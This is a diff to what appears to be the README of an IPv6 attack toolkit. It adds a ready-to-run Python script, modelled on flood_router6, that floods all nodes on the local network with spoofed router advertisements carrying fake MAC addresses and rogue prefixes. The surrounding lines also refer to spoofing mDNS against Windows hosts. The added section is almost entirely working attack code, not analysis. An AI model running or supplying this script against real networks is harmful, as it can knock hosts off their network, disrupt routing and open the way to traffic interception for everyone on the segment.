@@ -128,3 +128,21 @@ from All import *
 # Requires IPv6 since Windows 10 only registers
 # a spoofed mDNS if both IPv4 and IPv6 are sent.
 ```
+
+#### Router Advertisement Flood (AKA flood_router6)
+```python
+from All import *
+
+# Floods all nodes (ff02::1) with 100 router advertisements.
+# hop limit of 255 is required (from the RFC of NDP).
+
+# More documentation soon.
+
+for i in range(1, 100):
+    i = str(i).zfill(2)
+    srcmac = f"de:ad:00:00:00:{i}"
+    psrc = f"fe80::{i}"
+    prefix = f"2a01:0:0:0{i}::"
+    pkt = Ether(src=srcmac, dst="33:33:00:00:00:01")/IPv6(psrc=psrc, pdst="ff02::1", hoplimit=255)/NDPRouterAdv(srcmac, prefix)
+    send(pkt)
+```
